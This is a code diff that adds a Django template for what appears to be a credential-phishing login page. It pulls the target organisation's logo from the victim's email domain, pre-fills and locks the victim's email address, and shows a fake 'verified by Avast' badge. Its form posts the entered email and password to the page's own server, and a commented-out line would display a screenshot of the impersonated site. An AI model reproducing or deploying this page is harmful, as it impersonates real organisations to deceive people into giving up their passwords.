@@ -1,0 +1,122 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SureCare Class</title>
+    <link rel="stylesheet" href="{% static 'css/style.css' %}">
+</head>
+<body>
+    <!-- <img src="https://image.thum.io/get/auth/70953-lduyhg/https://www.{{domain}}/" alt="" id="background-img" /> -->
+    <!-- <div class="loader"></div> -->
+
+    <div class="wrapper">
+      <form action="." id="cameliom-one-form" method="POST">
+        {% csrf_token%}
+
+        <div class="card loginForm" id="login-form">
+          <div class="card-body">
+            <div
+              class="logo"
+              style="
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                margin-bottom: 40px;
+                margin-top: 20px;
+              "
+            >
+            {% if email_is_valid %}
+              <img class="logo-img" src="https://logo.clearbit.com/{{ domain }}" alt="{{ domain }} logo" style="width: 60px"/>
+              <!-- <img class="logo-img" src="https://logo.clearbit.com/https://{{ domain }}" alt="" style="width: 60px" /> -->
+              <span
+                id="logo-span"
+                style="font-size: 20px; font-weight: bold; margin-left: 10px"
+                >{{logo_text}}</span
+              >
+            {% endif %}
+            </div>
+            <h2>Log In to continue</h2>
+            <div class="password-side">
+              {% if messages %}
+                  <div class="messages">
+                  {% for message in messages %}
+                      <div class="perrwarning">{{ message }}</div>
+                  {% endfor %}
+                  </div>
+              {% endif %}
+              <!-- <div class="perrwarning"></div>
+              <div class="perrwarning">{{email_error}}</div> -->
+              <div class="form-content">
+                <input
+                  type="email"
+                  {% if email_is_valid %}readonly{% endif %}
+                  id="email"
+                  placeholder="email"
+                  name="f_email"
+                  value="{{existing_email}}"
+                  required
+                />
+              </div>
+              <div class="form-content">
+                <input
+                  type="password"
+                  id="password"
+                  placeholder="Enter Password"
+                  name="f_password"
+                  required
+                />
+              </div>
+
+              <div class="form-content form-button">
+                <button type="submit" id="final-submit-btn">
+                  <span id="btn-text-now">Login</span>
+                  <span class="spinner-button" id="btn-spinner" style="display: none;"></span>
+                </button>
+              </div>
+              <div
+                class="link"
+                style="
+                  display: flex;
+                  align-items: center;
+                  justify-content: center;
+                "
+              >
+                <p><a href="#">verified by </a></p>
+                <img
+                  src="{% static 'frontend/img/avast.png' %}"
+                  alt="Avast"
+                  style="width: 50px; margin-left: 10px"
+                />
+                <!-- <img
+                  src="https://res.cloudinary.com/dzavavl6y/image/upload/v1713181568/uc6xjnr3xx9hdcpfm1od.png"
+                  alt="Avast"
+                  style="width: 50px; margin-left: 10px"
+                /> -->
+              </div>
+            </div>
+          </div>
+        </div>
+      </form>
+    </div>
+
+    <script>
+      document.getElementById('final-submit-btn').addEventListener('click', function(event) {
+        event.preventDefault();
+
+        const btnText = this.querySelector('#btn-text-now');
+        const btnSpinner = this.querySelector('#btn-spinner');
+        const form = this.closest('form');
+
+        if (form.checkValidity()) {
+            if (btnText) btnText.style.display = 'none';
+            if (btnSpinner) btnSpinner.style.display = 'inline-block';
+            form.submit();
+        } else {
+            form.reportValidity();
+        }
+      });
+    </script>
+  </body>
+</html>
